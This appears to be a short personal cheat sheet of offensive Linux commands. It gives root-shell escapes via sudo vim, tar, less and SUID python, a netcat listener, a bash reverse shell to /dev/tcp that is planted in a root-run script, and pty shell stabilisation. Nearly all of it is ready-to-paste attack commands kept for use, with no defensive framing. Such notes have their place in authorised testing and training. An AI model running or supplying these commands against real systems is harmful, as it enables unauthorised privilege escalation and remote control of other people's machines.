#Privilege scalation with vim

there are 2 ways of running a shell as root with vim

##_First option_
sudo vim 
 -> :set shell=/bin/sh
 -> :shell

##_Second option_
sudo vim -c ':!/bin/sh'


#Privilege scalation with tar

If the user is allowed in the sudoers file we can easily become root by running _sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh_

#Using and understanding netcat

to set up a listening port in nc

nc -lnvp portnumber

#Read pcaps

Could use wireshark

If you are looking for a password strings will just do the job for it and it will provide more clarity

#Bash remote shell

echo 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"' > /path/to/script run by root

#Privesc with less
you can run less with _sudo_ against a file and enter in less's command mode by typing !/bin/sh

Example

sudo less file.log
!/bin/sh

#GTFOs bin with python

In order to get a privileged shell with python (only if it has the suid set) we can run

python -c 'import os; os.system("/bin/sh")'

#Stable shell with pty

When we stabblish the first shell with nc it tends not to have a pty which for some porcesses it can be stressful

to solve that you can run this python adhoc command python -c 'import pty; pty.spawn("/bin/bash")' which gets you a tty that lets you freely run all the commands you need without prompting any error nor warning about not having a tty
